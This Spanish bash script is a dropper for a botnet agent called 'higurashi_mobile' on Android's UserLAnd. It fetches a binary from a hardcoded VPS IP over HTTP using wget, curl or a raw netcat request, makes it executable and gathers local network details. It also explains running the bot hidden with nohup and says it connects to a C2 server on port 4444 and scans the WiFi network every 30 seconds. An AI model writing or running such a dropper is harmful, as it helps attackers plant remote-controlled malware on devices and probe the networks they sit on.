#!/bin/bash
# Setup script para higurashi_mobile en UserLAnd (sin root)

echo "╔══════════════════════════════════════════════════════════╗"
echo "║   HIGURASHI MOBILE - Instalador para UserLAnd           ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""

# Detectar IP del VPS
VPS_IP="93.95.231.134"
VPS_PORT="8080"

echo "[*] Descargando binario desde VPS: $VPS_IP:$VPS_PORT"
echo ""

# Método 1: wget (más común)
if command -v wget &> /dev/null; then
    echo "[+] Usando wget..."
    wget http://$VPS_IP:$VPS_PORT/higurashi_mobile -O higurashi_mobile 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[✓] Descarga completa con wget"
    fi
fi

# Método 2: curl (fallback)
if [ ! -f higurashi_mobile ] && command -v curl &> /dev/null; then
    echo "[+] Usando curl..."
    curl -o higurashi_mobile http://$VPS_IP:$VPS_PORT/higurashi_mobile 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[✓] Descarga completa con curl"
    fi
fi

# Método 3: nc (netcat) - último recurso
if [ ! -f higurashi_mobile ]; then
    echo "[+] Intentando con netcat..."
    echo -e "GET /higurashi_mobile HTTP/1.0\r\n\r\n" | nc $VPS_IP $VPS_PORT > higurashi_mobile.tmp 2>/dev/null
    # Remover headers HTTP
    tail -n +$(grep -n "^\r$" higurashi_mobile.tmp | head -1 | cut -d: -f1) higurashi_mobile.tmp > higurashi_mobile 2>/dev/null
    rm -f higurashi_mobile.tmp
    if [ -f higurashi_mobile ] && [ -s higurashi_mobile ]; then
        echo "[✓] Descarga completa con nc"
    fi
fi

# Verificar descarga
if [ ! -f higurashi_mobile ] || [ ! -s higurashi_mobile ]; then
    echo "[-] Error: No se pudo descargar el binario"
    echo ""
    echo "SOLUCIÓN ALTERNATIVA:"
    echo "1. En tu PC/VPS, ejecuta:"
    echo "   python3 -m http.server 8080"
    echo ""
    echo "2. En UserLAnd, ejecuta:"
    echo "   wget http://$VPS_IP:8080/higurashi_mobile"
    echo ""
    exit 1
fi

# Dar permisos de ejecución
chmod +x higurashi_mobile 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[✓] Permisos de ejecución aplicados"
else
    echo "[!] No se pudieron cambiar permisos (intenta: chmod 755 higurashi_mobile)"
fi

# Obtener info del sistema
echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║                    INFORMACIÓN DEL SISTEMA               ║"
echo "╚══════════════════════════════════════════════════════════╝"

echo -n "[*] Arquitectura: "
uname -m

echo -n "[*] IP local: "
ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' || echo "No detectada"

echo -n "[*] Red WiFi: "
getprop wifi.interface 2>/dev/null || echo "wlan0 (por defecto)"

echo -n "[*] Gateway: "
ip route | grep default | awk '{print $3}' | head -1 || echo "192.168.1.1 (asumido)"

# Tamaño del binario
SIZE=$(ls -lh higurashi_mobile | awk '{print $5}')
echo "[*] Tamaño del binario: $SIZE"

echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║                    INSTRUCCIONES DE USO                  ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
echo "Para ejecutar en PRIMER PLANO (ver output):"
echo "  ./higurashi_mobile"
echo ""
echo "Para ejecutar en BACKGROUND (daemon):"
echo "  nohup ./higurashi_mobile > /dev/null 2>&1 &"
echo ""
echo "Para verificar si está corriendo:"
echo "  ps aux | grep higurashi_mobile"
echo ""
echo "Para matar el proceso:"
echo "  pkill -9 higurashi_mobile"
echo ""
echo "NOTA: El bot se conectará automáticamente al C2 en $VPS_IP:4444"
echo "      Y escaneará la red WiFi actual cada 30 segundos."
echo ""

# Preguntar si ejecutar ahora
echo -n "¿Ejecutar ahora? [y/N]: "
read -r response

if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]; then
    echo ""
    echo "[*] Ejecutando higurashi_mobile..."
    echo "[*] Presiona Ctrl+C para detener"
    echo ""
    ./higurashi_mobile
else
    echo ""
    echo "[✓] Instalación completa. Ejecuta './higurashi_mobile' cuando estés listo."
fi
